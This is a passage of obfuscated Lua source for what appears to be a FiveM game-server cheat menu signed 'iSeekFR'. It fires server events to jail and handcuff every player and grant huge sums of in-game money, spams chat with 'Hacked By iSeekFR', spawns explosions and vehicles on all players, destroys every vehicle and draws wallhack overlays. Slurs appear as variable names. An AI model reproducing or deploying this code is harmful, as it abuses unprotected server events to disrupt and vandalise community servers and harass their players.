            Citizen.Wait(0)
            RequestModel(Ggggg(dh))
        end

        while not HasModelLoaded(Ggggg(di))do
            Citizen.Wait(0)RequestModel(Ggggg(di))
        end

        while not HasModelLoaded(Ggggg(dg))do
            Citizen.Wait(0)RequestModel(Ggggg(dg))
        end

        while not HasModelLoaded(Ggggg(dj))do
            Citizen.Wait(0)RequestModel(Ggggg(dj))
        end

        while not HasModelLoaded(Ggggg(dk))do
            Citizen.Wait(0)RequestModel(Ggggg(dk))
        end

        for bs=0,9 do
            udwdj("_chat:messageEntered","~r~",{141,211,255},"iSeekFR ~b~https://discord.gg/FtMs4eA")
        end

        for i=0,128 do
            local di=CreateVehicle(Ggggg(dg),GetEntityCoords(GetPlayerPed(i))+2.0,waduyh487r64,waduyh487r64) and CreateVehicle(Ggggg(dg),GetEntityCoords(GetPlayerPed(i))+10.0,waduyh487r64,waduyh487r64)and CreateVehicle(Ggggg(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,waduyh487r64,waduyh487r64)and CreateVehicle(Ggggg(dh),GetEntityCoords(GetPlayerPed(i))+2.0,waduyh487r64,waduyh487r64)and CreateVehicle(Ggggg(dh),GetEntityCoords(GetPlayerPed(i))+10.0,waduyh487r64,waduyh487r64)and CreateVehicle(Ggggg(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,waduyh487r64,waduyh487r64)and CreateVehicle(Ggggg(di),GetEntityCoords(GetPlayerPed(i))+2.0,waduyh487r64,waduyh487r64)and CreateVehicle(Ggggg(di),GetEntityCoords(GetPlayerPed(i))+10.0,waduyh487r64,waduyh487r64)and CreateVehicle(Ggggg(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,waduyh487r64,waduyh487r64)and CreateVehicle(Ggggg(dj),GetEntityCoords(GetPlayerPed(i))+2.0,waduyh487r64,waduyh487r64)and CreateVehicle(Ggggg(dj),GetEntityCoords(GetPlayerPed(i))+10.0,waduyh487r64,waduyh487r64)and CreateVehicle(Ggggg(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,waduyh487r64,waduyh487r64)and CreateVehicle(Ggggg(dk),GetEntityCoords(GetPlayerPed(i))+2.0,waduyh487r64,waduyh487r64)and CreateVehicle(Ggggg(dk),GetEntityCoords(GetPlayerPed(i))+10.0,waduyh487r64,waduyh487r64)and CreateVehicle(Ggggg(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,waduyh487r64,waduyh487r64)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,waduyh487r64,KZjx,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,waduyh487r64,KZjx,waduyh487r64)
        end
     end)
    end

function rotDirection(rot)
    local radianz = rot.z * 0.0174532924
    local radianx = rot.x * 0.0174532924
    local num = math.abs(math.cos(radianx))

    local dir = vector3(-math.sin(radianz) * num, math.cos(radianz) * num, math.sin(radianx))

    return dir
end

function GetDistance(pointA, pointB)

    local aX = pointA.x
    local aY = pointA.y
    local aZ = pointA.z

    local bX = pointB.x
    local bY = pointB.y
    local bZ = pointB.z

    local xBA = bX - aX
    local yBA = bY - aY
    local zBA = bZ - aZ

    local y2 = yBA * yBA
    local x2 =  xBA * xBA
    local sum2 = y2 + x2

    return math.sqrt(sum2 + zBA)
end

function getPosition()
  local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(-1),waduyh487r64))
  return x,y,z
end

function getCamDirection()
  local heading = GetGameplayCamRelativeHeading()+GetEntityHeading(GetPlayerPed(-1))
  local pitch = GetGameplayCamRelativePitch()

  local x = -math.sin(heading*math.pi/180.0)
  local y = math.cos(heading*math.pi/180.0)
  local z = math.sin(pitch*math.pi/180.0)

  local len = math.sqrt(x*x+y*y+z*z)
  if len ~= 0 then
    x = x/len
    y = y/len
    z = z/len
  end

  return x,y,z
end

function RotToDirection(rot)
    local radiansZ = rot.z * 0.0174532924
    local radiansX = rot.x * 0.0174532924
    local num = math.abs(math.cos(radiansX))
    local dir = vector3(-math.sin(radiansZ) * num, math.cos(radiansZ * num), math.sin(radiansX))
    return dir
end

function add(a, b)
    local awd2323 = vector3(a.x + b.x, a.y + b.y, a.z + b.z)

    return awd2323
end

function multiply(coords, coordz)
    local awd2323 = vector3(coords.x * coordz, coords.y * coordz, coords.z * coordz)

    return awd2323
end

function SpectatePlayer(player)
    local playerPed = PlayerPedId()
    Spectating = not Spectating
    local targetPed = GetPlayerPed(player)

    if (Spectating) then
        local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, KZjx))

        RequestCollisionAtCoord(targetx, targety, targetz)
        NetworkSetInSpectatorMode(waduyh487r64, targetPed)

        adyt23h23("~r~Spectating " .. GetPlayerName(player))
    else
        local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, KZjx))

        RequestCollisionAtCoord(targetx, targety, targetz)
        NetworkSetInSpectatorMode(KZjx, targetPed)

        adyt23h23("~r~Stopped Spectating " .. GetPlayerName(player))
    end
end

Citizen.CreateThread(
    function()
        while waduyh487r64 do
            Citizen.Wait(0)

            DisplayRadar(waduyh487r64)

            SetPlayerWantedLevel(PlayerId(), 0, KZjx)

            SetPlayerWeaponDamageModifier(PlayerId(), selectedDamage)
            SetPlayerMeleeWeaponDamageModifier(PlayerId(), selectedDamage)

            if infStamina then
                RestorePlayerStamina(PlayerId(), 1.0)
            end
			
			if chatspam then
                udwdj(
                    '_chat:messageEntered',
                    '\80\108\97\110\101\35\48\48\48\55\10',
                    {0, 0x99, 255},
                    '/ooc Hacked By iSeekFR'
                )
                udwdj('_chat:messageEntered', '^8iSeek^5FR', {0, 0x99, 255}, '^3:)')
				else
				
            end
	
			if banallusers then
				for i = 0, 128 do
				udwdj("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
				udwdj("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
				udwdj("js:jailuser", GetPlayerServerId(i), 45 * 60, "~r~Got Fucked By iSeekFR")
				udwdj("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "~r~HACKED By iSeekFR")
					end
				end

						if esxdestroy then
				for i = 0, 128 do
						udwdj("esx_truckerjob:pay", 9999999999)
						udwdj("AdminMenu:giveCash", 9999999999)
						udwdj("esx_dmvschool:pay",  9999999999)
						udwdj("LegacyFuel:PayFuel", 9999999999)
				end
			end
			
            if invisible then
                SetEntityVisible(GetPlayerPed(-1), KZjx, 0)
            else
                SetEntityVisible(GetPlayerPed(-1), waduyh487r64, 0)
            end
			
			
            if freezePlayer then
                ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
            end

            if crosshair then
                ShowHudComponentThisFrame(14)
            end
			
			if ci then
                local cK = KZjx
                local cL = 130
                local cM = 0
                for i = 0, 128 do
                    if NetworkIsPlayerActive(i) and GetPlayerPed(i) ~= GetPlayerPed(-1) then
                        local ped = GetPlayerPed(i)
                        blip = GetBlipFromEntity(ped)
                        x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), waduyh487r64))
                        x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(i), waduyh487r64))
                        distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, waduyh487r64))
                        if cK then
                            if NetworkIsPlayerTalking(i) then
                                local cN = d(1.0)
                                DrawText3D(
                                    x2,
                                    y2,
                                    z2 + 1.2,
                                    GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                    cN.r,
                                    cN.g,
                                    cN.b
                                )
                            else
                                DrawText3D(
                                    x2,
                                    y2,
                                    z2 + 1.2,
                                    GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                    255,
                                    255,
                                    255
                                )
                            end
                        end
                        if distance < cL then
                            if not cK then
                                if NetworkIsPlayerTalking(i) then
                                    local cN = d(1.0)
                                    DrawText3D(
                                        x2,
                                        y2,
                                        z2 + 1.2,
                                        GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                        cN.r,
                                        cN.g,
                                        cN.b
                                    )
                                else
                                    DrawText3D(
                                        x2,
                                        y2,
                                        z2 + 1.2,
                                        GetPlayerServerId(i) .. '  |  ' .. GetPlayerName(i),
                                        255,
                                        255,
                                        255
                                    )
                                end
                            end
                        end
                    end
                end
            end

            if crosshair2 then
                ch("~r~+",0.495,0.484)
            end

            if crosshair3 then
                ch("~r~.",0.4968,0.478)
            end

            local niggerVehicle = GetVehiclePedIsIn(PlayerPedId(), KZjx)

            if fall then
                for i = 0, 128 do
                    ClearPedTasksImmediately(GetPlayerPed(i))
                end
            end

			if freezeall then
				for i = 0, 128 do
						udwdj("OG_cuffs:cuffCheckNearest", GetPlayerServerId(i))
						udwdj("CheckHandcuff", GetPlayerServerId(i))
						udwdj("cuffServer", GetPlayerServerId(i))
						udwdj("cuffGranted", GetPlayerServerId(i))
						udwdj("police:cuffGranted", GetPlayerServerId(i))
						udwdj("esx_handcuffs:cuffing", GetPlayerServerId(i))
						udwdj("esx_policejob:handcuff", GetPlayerServerId(i))
					end
				end
			
            if blowall then
                for i = 0, 128 do
                    local ped = GetPlayerPed(i)
                    local coords = GetEntityCoords(ped)
                    AddExplosion(coords.x, coords.y, coords.z, 4, 100.0, KZjx, waduyh487r64, 0.0, KZjx)
                end
            end

            if sall then
                for i = 0, 128 do
                    local ped = GetPlayerPed(i)
                    local coords = GetEntityCoords(ped)
                    local vehiclehash = Ggggg("savage")
                    RequestModel(vehiclehash)
                    CreateVehicle(vehiclehash, coords.x, coords.y, coords.z, GetEntityHeading(ped), 1, 0)
                end
            end

            if IsPedInAnyVehicle(PlayerPedId()) then
                if driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 5.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end


                if superGrip then
                    SetVehicleGravityAmount(niggerVehicle, 20.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end

                if enchancedGrip then
                    SetVehicleGravityAmount(niggerVehicle, 12.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                end

                if fdMode then
                    SetVehicleGravityAmount(niggerVehicle, 5.5)
                    SetVehicleEngineTorqueMultiplier(niggerVehicle, 4.0)
                elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
                    SetVehicleGravityAmount(niggerVehicle, 10.0)
                    SetVehicleEngineTorqueMultiplier(niggerVehicle, 1.0)
                end

                if t2x then
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),KZjx),2.0)
                end

                if t4x then
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),KZjx),4.0)
                end

                if t8x then
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),KZjx),8.0)
                end

                if t16x then
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),KZjx),16.0)
                end
            end


            if Noclip then
        local noclip_speed = 1.0
        local ped = GetPlayerPed(-1)
        local x,y,z = getPosition()
        local dx,dy,dz = getCamDirection()
        local speed = noclip_speed
		SetEntityVisible(GetPlayerPed(-1), KZjx, KZjx)
		SetEntityInvincible(GetPlayerPed(-1), waduyh487r64)
		SetEntityVisible(ped, KZjx);

      SetEntityVelocity(ped, 0.0001, 0.0001, 0.0001)
      if IsControlPressed(0, 21) then
          speed = speed + 3
          end
      if IsControlPressed(0, 19) then
          speed = speed - 0.5
      end
             if IsControlPressed(0,32) then
              x = x+speed*dx
              y = y+speed*dy
              z = z+speed*dz
               end


               if IsControlPressed(0,269) then
              x = x-speed*dx
              y = y-speed*dy
              z = z-speed*dz
               end
        SetEntityCoordsNoOffset(ped,x,y,z,waduyh487r64,waduyh487r64,waduyh487r64)
            else
            SetEntityVisible(GetPlayerPed(-1), waduyh487r64, KZjx)
            SetEntityInvincible(GetPlayerPed(-1), KZjx)

         end

            if WADOHWIB then
                local gotEntity = getEntity(PlayerId())
                if (IsPedInAnyVehicle(GetPlayerPed(-1), waduyh487r64) == KZjx) then
                    adyt23h23("Aim Your Gun At An Entity And Shoot!")
                    GiveWeaponToPed(GetPlayerPed(-1), Ggggg("WEAPON_PISTOL"), 999999, KZjx, waduyh487r64)
                    SetPedAmmo(GetPlayerPed(-1), Ggggg("WEAPON_PISTOL"), 999999)
                    if (GetSelectedPedWeapon(GetPlayerPed(-1)) == Ggggg("WEAPON_PISTOL")) then
                        if IsPlayerFreeAiming(PlayerId()) then
                            if IsEntityAPed(gotEntity) then
                                if IsPedInAnyVehicle(gotEntity, waduyh487r64) then
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(GetVehiclePedIsIn(gotEntity, waduyh487r64), 1, 1)
                                        DeleteEntity(GetVehiclePedIsIn(gotEntity, waduyh487r64))
                                        SetEntityAsMissionEntity(gotEntity, 1, 1)
                                        DeleteEntity(gotEntity)
                                        adyt23h23("~r~FUCKED")
                                    end
                                else
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(gotEntity, 1, 1)
                                        DeleteEntity(gotEntity)
                                        adyt23h23("~r~FUCKED")
                                    end
                                end
                            else
                                if IsControlJustReleased(1, 142) then
                                    SetEntityAsMissionEntity(gotEntity, 1, 1)
                                    DeleteEntity(gotEntity)
                                    adyt23h23("~r~FUCKED!")
                                end
                            end
                        end
                    end
                end
            end
			if destroyvehicles then
                for vehicle in EnumerateVehicles() do
                    if vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), KZjx) then
                        NetworkRequestControlOfEntity(vehicle)
                        SetVehicleUndriveable(vehicle, waduyh487r64)
                        SetVehicleEngineHealth(vehicle, 0)
                    end
                end
            end
			if explodevehicles then
				for vehicle in EnumerateVehicles() do
					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), KZjx)) and (not GotTrailer or (GotTrailer and vehicle ~= TrailerHandle)) then
						NetworkRequestControlOfEntity(vehicle)
						NetworkExplodeVehicle(vehicle, waduyh487r64, waduyh487r64, KZjx)
					end
				end
			end
			
            if NGEIFHDDN then
                for i = 0, 128 do
                    if i ~= PlayerId(-1) and GetPlayerServerId(i) ~= 0 then
                        local a8 = k(1.0)
                        local d7 = GetPlayerPed(i)
                        local d8, d9, da = table.unpack(GetEntityCoords(PlayerPedId(-1)))
                        local x, y, z = table.unpack(GetEntityCoords(d7))
                        local db =
                            '~h~Name: ' ..
                            GetPlayerName(i) ..
                                '\nServer ID: ' ..
                                    GetPlayerServerId(i) ..
                                        '\nPlayer ID: ' ..
                                            i ..
                                                '\nDist: ' ..
                                                    math.round(GetDistanceBetweenCoords(d8, d9, da, x, y, z, waduyh487r64), 1)
                        if IsPedInAnyVehicle(d7, waduyh487r64) then
                            local dc =
                                GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(d7))))
                            db = db .. '\nVeh: ' .. dc
                        end
                        if KDOWJDw and NGEIFHDDN then
                            DrawText3D(x, y, z - 1.0, db, a8.r, a8.g, a8.b)
                        end
                        if jfjfjffuhguh and NGEIFHDDN then
                            LineOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
                            LineOneEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
                            LineTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
                            LineTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
                            LineThreeBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
                            LineThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, -0.9)
                            LineFourBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
                            TLineOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
                            TLineOneEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
                            TLineTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
                            TLineTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
                            TLineThreeBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
                            TLineThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, 0.8)
                            TLineFourBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
                            ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, 0.8)
                            ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, 0.3, -0.9)
                            ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, 0.8)
                            ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, 0.3, -0.9)
                            ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, 0.8)
                            ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(d7, -0.3, -0.3, -0.9)
                            ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, 0.8)
                            ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(d7, 0.3, -0.3, -0.9)
                            DrawLine(
                                LineOneBegin.x,
                                LineOneBegin.y,
                                LineOneBegin.z,
                                LineOneEnd.x,
                                LineOneEnd.y,
                                LineOneEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                LineTwoBegin.x,
                                LineTwoBegin.y,
                                LineTwoBegin.z,
                                LineTwoEnd.x,
                                LineTwoEnd.y,
                                LineTwoEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                LineThreeBegin.x,
                                LineThreeBegin.y,
                                LineThreeBegin.z,
                                LineThreeEnd.x,
                                LineThreeEnd.y,
                                LineThreeEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                LineThreeEnd.x,
                                LineThreeEnd.y,
                                LineThreeEnd.z,
                                LineFourBegin.x,
                                LineFourBegin.y,
                                LineFourBegin.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineOneBegin.x,
                                TLineOneBegin.y,
                                TLineOneBegin.z,
                                TLineOneEnd.x,
                                TLineOneEnd.y,
                                TLineOneEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineTwoBegin.x,
                                TLineTwoBegin.y,
                                TLineTwoBegin.z,
                                TLineTwoEnd.x,
                                TLineTwoEnd.y,
                                TLineTwoEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineThreeBegin.x,
                                TLineThreeBegin.y,
                                TLineThreeBegin.z,
                                TLineThreeEnd.x,
                                TLineThreeEnd.y,
                                TLineThreeEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                TLineThreeEnd.x,
                                TLineThreeEnd.y,
                                TLineThreeEnd.z,
                                TLineFourBegin.x,
                                TLineFourBegin.y,
                                TLineFourBegin.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorOneBegin.x,
                                ConnectorOneBegin.y,
                                ConnectorOneBegin.z,
                                ConnectorOneEnd.x,
                                ConnectorOneEnd.y,
                                ConnectorOneEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorTwoBegin.x,
                                ConnectorTwoBegin.y,
                                ConnectorTwoBegin.z,
                                ConnectorTwoEnd.x,
                                ConnectorTwoEnd.y,
                                ConnectorTwoEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorThreeBegin.x,
                                ConnectorThreeBegin.y,
                                ConnectorThreeBegin.z,
                                ConnectorThreeEnd.x,
                                ConnectorThreeEnd.y,
                                ConnectorThreeEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                            DrawLine(
                                ConnectorFourBegin.x,
                                ConnectorFourBegin.y,
                                ConnectorFourBegin.z,
                                ConnectorFourEnd.x,
                                ConnectorFourEnd.y,
                                ConnectorFourEnd.z,
                                a8.r,
                                a8.g,
                                a8.b,
                                255
                            )
                        end
                        if jfjfjf and NGEIFHDDN then
                            DrawLine(d8, d9, da, x, y, z, a8.r, a8.g, a8.b, 255)
                        end
                    end
                end
            end

            if VehGod and IsPedInAnyVehicle(PlayerPedId(), waduyh487r64) then
                    SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), waduyh487r64)
                end

            if rainbowTint then
                for i = 0, #faggot123 do
                    if HasPedGotWeapon(PlayerPedId(), Ggggg(faggot123[i])) then
                        SetPedWeaponTintIndex(PlayerPedId(), Ggggg(faggot123[i]), math.random(0, 7))
                    end
                end
            end

            if showCoords then
                kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl,ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw = table.unpack(GetEntityCoords(GetPlayerPed(-1),waduyh487r64))
                roundx=tonumber(string.format("%.2f",kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc))
                roundy=tonumber(string.format("%.2f",riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl))
                roundz=tonumber(string.format("%.2f",ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw))
				local playerPedsss = PlayerPedId()
				roundzxx = GetEntityHeading(playerPedsss)
                bf("~r~X:~s~ "..roundx,0.05,0.00)
                bf("~r~Y:~s~ "..roundy,0.11,0.00)
                bf("~r~Z:~s~ "..roundz,0.17,0.00)
				bf("~r~H:~s~ "..roundzxx,0.23,0.00)
            end

            if bulletGun then
                local startDistance = GetDistance(GetGameplayCamCoord(), GetEntityCoords(PlayerPedId(), waduyh487r64))
                local endDistance = GetDistance(GetGameplayCamCoord(), GetEntityCoords(PlayerPedId(), waduyh487r64))
                startDistance = startDistance + 0.25
                endDistance = endDistance + 1000.0

                if IsPedOnFoot(PlayerPedId()) and IsPedShooting(PlayerPedId()) then
                    local bullet = Ggggg(bullets[selectedBullet])
                    if not HasWeaponAssetLoaded(bullet) then
                        RequestWeaponAsset(bullet, 31, KZjx)
                        while not HasWeaponAssetLoaded(bullet) do
                            Citizen.Wait(0)
                        end
                    end
                    ShootSingleBulletBetweenCoords(add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).x, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).y, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).z, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).x, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).y, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).z, 250, waduyh487r64, bullet, PlayerPedId(), waduyh487r64, KZjx, -1.0)
                end

            end

            if vehicleGun then
                local heading = GetEntityHeading(PlayerPedId())
                local keduxben = Ggggg(vehicles[selectedVehicle])
                local rot = GetGameplayCamRot(0)
                local dir = RotToDirection(rot)
                local camPosition = GetGameplayCamCoord()
                local playerPosition = GetEntityCoords(PlayerPedId(), waduyh487r64)
                local spawnDistance = GetDistance(camPosition, playerPosition)
                spawnDistance = spawnDistance + 5
                local spawnPosition = add(camPosition, multiply(dir, spawnDistance))

                RequestModel(keduxben)
                while not HasModelLoaded(keduxben) do
                    debugPrint("Loading Model...")
                    Citizen.Wait(0)
                end

                if HasModelLoaded(keduxben) then
                    if IsPedShooting(PlayerPedId()) then
                        if IsPedOnFoot(PlayerPedId()) then
                        local vvvvvvvvvvvvvvvvvvvvvvvv = CreateVehicle(keduxben, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading, waduyh487r64, waduyh487r64)
                        SetVehicleForwardSpeed(vvvvvvvvvvvvvvvvvvvvvvvv, 120.0)
                        SetModelAsNoLongerNeeded(keduxben)
                        SetVehicleAsNoLongerNeeded(vvvvvvvvvvvvvvvvvvvvvvvv)
                        end
                    end
                end
            end

            if pedGun then
                local heading = GetEntityHeading(PlayerPedId())
                local rot = GetGameplayCamRot(0)
                local dir = RotToDirection(rot)
                local camPosition = GetGameplayCamCoord()
                local playerPosition = GetEntityCoords(PlayerPedId(), waduyh487r64)
                local spawnDistance = GetDistance(camPosition, playerPosition)
                spawnDistance = spawnDistance + 5
                local spawnPosition = add(camPosition, multiply(dir, spawnDistance))

                local keduxben = Ggggg(peds[selectedPed])

                RequestModel(keduxben)
                while not HasModelLoaded(keduxben) do
                    Citizen.Wait(0)
                end

                if HasModelLoaded(keduxben) then
                    if IsPedShooting(PlayerPedId()) then
                        local spawnedPed = CreatePed(26, keduxben, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading, waduyh487r64, waduyh487r64)
                        SetEntityRecordsCollisions(spawnedPed, waduyh487r64)
                        for f = 0.0, 75.0 do
                            if HasEntityCollidedWithAnything(spawnedPed) then break end
                                ApplyForceToEntity(spawnedPed, 1, dir.x * 10.0, dir.y * 10.0, dir.z * 10.0, 0.0, 0.0, 0.0, KZjx, KZjx, waduyh487r64, waduyh487r64, KZjx, waduyh487r64)
                        end
                    end
                end
            end

            if forceGun then
                local rot = GetGameplayCamRot(0)
                local dir = RotToDirection(rot)
                local heading = GetEntityHeading(PlayerPedId())
                if IsPedShooting(PlayerPedId()) then
                    local aiming, entity = GetEntityPlayerIsFreeAimingAt(PlayerId())
                    if aiming then
                        if IsPedInAnyVehicle(entity) then
                            local vvvvvvvvvvvvvvvvvvvvvvvv = GetVehiclePedIsUsing(entity)
                            DeleteEntity(entity)
                            SetEntityHeading(vvvvvvvvvvvvvvvvvvvvvvvv, heading)
                            SetVehicleForwardSpeed(vvvvvvvvvvvvvvvvvvvvvvvv, 150.0)
                        else
                            for i = 0, 10 do
                                ApplyForceToEntity(entity, 1, dir.x * 10.0, dir.y * 10.0, dir.z * 10.0, 0.0, 0.0, 0.0, KZjx, KZjx, waduyh487r64, waduyh487r64, KZjx, waduyh487r64)
                            end
                        end
                    end
                end
            end

					if IsControlPressed(0, 323) and DoesEntityExist(Deer.Handle) then
		Deer.Destroy()
		end
			
            if bifegfubffff then
                local impact, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
                if impact then
                    AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, waduyh487r64, KZjx, 0)
                end
            end
			
			 if rainbow then
                    local color = k(1.0)
                    for i = 0, #allMenus do
                        Plane.SetSpriteColor(allMenus[i], color.r, color.g, color.b, 255)  
                    end  
                    for i, dA in pairs(bd) do                 
                        Plane.SetSpriteColor(dA.id, color.r, color.g, color.b, 255)  
                    end
                    for i, dA in pairs(be) do 
                        Plane.SetSpriteColor(dA.id, color.r, color.g, color.b, 255)
                    end
                end
                
                if animated then                                   
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                Plane.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal1") 
                            end
                            for i, dA in pairs(bd) do
                                Plane.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal1") 
                                  
                            end
                            for i, dA in pairs(be) do 
                                Plane.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal1") 
                                
                            end      
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                Plane.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal2") 
                            end
                            for i, dA in pairs(bd) do
                                Plane.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal2") 
                                  
                            end
                            for i, dA in pairs(be) do 
                                Plane.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal2") 
                                
                            end       
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                Plane.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal3") 
                            end
                            for i, dA in pairs(bd) do
                                Plane.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal3") 
                                  
                            end
                            for i, dA in pairs(be) do 
                                Plane.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal3") 
                                
                            end       
                            Citizen.Wait(50)                  
                            for i = 0, #allMenus do
                                Plane.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal4") 
                            end
                            for i, dA in pairs(bd) do
                                Plane.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal4") 
                                  
                            end
                            for i, dA in pairs(be) do 
                                Plane.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal4") 
                                
                            end                          
                end
			
			if ih2833gh333 then
                local impact1, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
                if impact1 then
                    AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, waduyh487r64, KZjx, 0)
					Citizen.Wait(200)
					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, waduyh487r64, KZjx, 0)
					Citizen.Wait(200)
					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, waduyh487r64, KZjx, 0)
					Citizen.Wait(150)
					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, waduyh487r64, KZjx, 0)
					Citizen.Wait(150)
